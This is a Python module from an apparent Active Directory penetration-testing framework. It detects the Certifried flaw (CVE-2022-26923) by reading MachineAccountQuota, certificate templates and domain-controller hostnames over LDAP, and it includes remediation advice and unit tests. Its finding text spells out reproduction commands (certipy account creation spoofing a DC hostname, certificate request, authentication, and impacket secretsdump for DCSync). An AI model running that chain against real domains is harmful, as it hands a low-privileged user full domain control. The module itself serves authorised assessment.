"""Certifried (CVE-2022-26923) — machine account dNSHostName collision for DA via cert."""
from __future__ import annotations

import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity
from adforge.core.ldap_client import LdapClient

CVSS_CERTIFRIED = "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"
CVSS40_CERTIFRIED = "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H"
class Certifried(BaseModule):
    """Certifried CVE-2022-26923 — low-priv user → Domain Admin via machine account cert."""

    NAME        = "certifried"
    DESCRIPTION = "Check CVE-2022-26923: MachineAccountQuota + dNSHostName collision → DC impersonation"
    PHASE       = 4
    TAGS        = ["attacks", "certifried", "adcs", "cve-2022-26923", "mitre-T1649"]

    async def run(self) -> ModuleResult:
        start  = time.monotonic()
        domain = self.config.extra.get("domain", "")
        dc_ip  = self.config.extra.get("dc", self.config.target)

        if not self.check_scope(dc_ip):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        if not self._has_creds():
            return self._make_result(start, skipped=True, skip_reason="credentials required")

        client = LdapClient(
            dc_ip=dc_ip, domain=domain,
            username=self.config.extra.get("username", ""),
            password=self.config.extra.get("password", ""),
        )
        if not client.connect():
            return self._make_result(start)

        try:
            await self._check_certifried(client, domain, dc_ip)
        finally:
            client.disconnect()

        return self._make_result(start)

    async def _check_certifried(self, client: LdapClient, domain: str, dc_ip: str) -> None:
        # 1. Check MachineAccountQuota
        domain_info = client.get_domain_info()
        maq = int(str(domain_info.get("ms-DS-MachineAccountQuota") or 0))

        # 2. Check for vulnerable machine certificate templates
        dc_parts     = ",".join(f"DC={p}" for p in domain.split("."))
        config_nc    = f"CN=Configuration,{dc_parts}"
        templates_dn = f"CN=Certificate Templates,CN=Public Key Services,CN=Services,{config_nc}"

        machine_templates = client.search(
            "(&(objectClass=pKICertificateTemplate)"
            "(|(cn=Machine)(cn=Computer)(cn=DomainController)(cn=Workstation)))",
            ["cn", "msPKI-Certificate-Name-Flag", "msPKI-Enrollment-Flag",
             "pKIExtendedKeyUsage", "msPKI-RA-Signature"],
            base_dn=templates_dn,
        )

        # 3. Check domain controllers' dNSHostName
        dc_computers = client.search(
            "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))",
            ["sAMAccountName", "dNSHostName"],
        )
        dc_dns_names = {
            str(dc.get("dNSHostName", "")).lower()
            for dc in dc_computers
            if dc.get("dNSHostName")
        }

        # Determine vulnerability
        # Vulnerable if: MAQ > 0 AND at least one machine template exists AND AD CS is deployed
        adcs_deployed = bool(machine_templates)
        vulnerable    = maq > 0 and adcs_deployed

        ev = Evidence(extra={
            "machine_account_quota":   maq,
            "adcs_deployed":           adcs_deployed,
            "machine_templates_found": [t.get("cn") for t in machine_templates],
            "dc_dns_names":            list(dc_dns_names),
            "vulnerable":              vulnerable,
        })

        if vulnerable:
            template_name = machine_templates[0].get("cn", "Machine") if machine_templates else "Machine"
            dc_fqdn = next(iter(dc_dns_names), f"dc.{domain}")
            self.new_finding(
                title=f"Certifried (CVE-2022-26923) — MachineAccountQuota={maq}, ADCS Deployed",
                severity=Severity.CRITICAL,
                description=(
                    f"Domain is vulnerable to Certifried (CVE-2022-26923).\n\n"
                    f"MachineAccountQuota = {maq}: any domain user can create machine accounts.\n"
                    f"AD CS is deployed with machine certificate template(s): "
                    f"{[t.get('cn') for t in machine_templates]}.\n\n"
                    "Attack chain:\n"
                    "1. Create machine account as low-priv user (via MachineAccountQuota)\n"
                    f"2. Set dNSHostName of new account to a DC's FQDN (e.g. {dc_fqdn})\n"
                    "3. Request a machine certificate — SAN uses dNSHostName\n"
                    "4. Certificate now impersonates the DC\n"
                    "5. Use certificate for PKINIT → get DC's TGT → DCSync → full domain compromise"
                ),
                reproduction_steps=[
                    "# Using certipy (all-in-one):",
                    f"certipy account create -u lowpriv@{domain} -p 'Pass' -user certifried$ "
                    f"-dns {dc_fqdn} -dc-ip {dc_ip}",
                    f"certipy req -u certifried$@{domain} -p 'certifried$' "
                    f"-ca <ca-name> -template {template_name} -dc-ip {dc_ip}",
                    f"certipy auth -pfx certifried.pfx -dc-ip {dc_ip}",
                    "# Then use hash for DCSync:",
                    f"impacket-secretsdump -hashes :<dc_hash> {domain}/dc$ @{dc_ip}",
                ],
                remediation=(
                    "Set MachineAccountQuota to 0 (prevent standard users from joining computers): "
                    "Set-ADDomain -Identity (Get-ADDomain) -Replace @{'ms-DS-MachineAccountQuota'=0}\n"
                    "Apply KB5014754 patch (May 2022 cumulative update) on all DCs. "
                    "Restrict machine template enrollment to authorized accounts only."
                ),
                references=[
                    "CVE-2022-26923",
                    "KB5014754",
                    "https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098652bef4",
                    "MITRE T1649",
                ],
                evidence=ev,
                cvss_v31_vector=CVSS_CERTIFRIED,
                cvss_v40_vector=CVSS40_CERTIFRIED,
                mitre_attack=["TA0004/T1649", "TA0006/T1558"],
                target=dc_ip,
            )
        else:
            reasons = []
            if maq == 0:
                reasons.append("MachineAccountQuota = 0 (users cannot create machine accounts)")
            if not adcs_deployed:
                reasons.append("No AD CS machine templates found")
            self.log.info("Certifried: not exploitable — %s", "; ".join(reasons))

    def _has_creds(self) -> bool:
        return bool(
            self.config.extra.get("username") and
            (self.config.extra.get("password") or self.config.extra.get("hash"))
        )


class TestCertifried:
    def test_cvss(self) -> None:
        assert CVSS_CERTIFRIED.startswith("CVSS:3.1")

    def test_has_creds(self) -> None:
        mod = Certifried.__new__(Certifried)
        mod.config = type("C", (), {"extra": {"username": "u", "password": "p"}})()
        assert mod._has_creds() is True
        mod.config = type("C", (), {"extra": {}})()
        assert mod._has_creds() is False
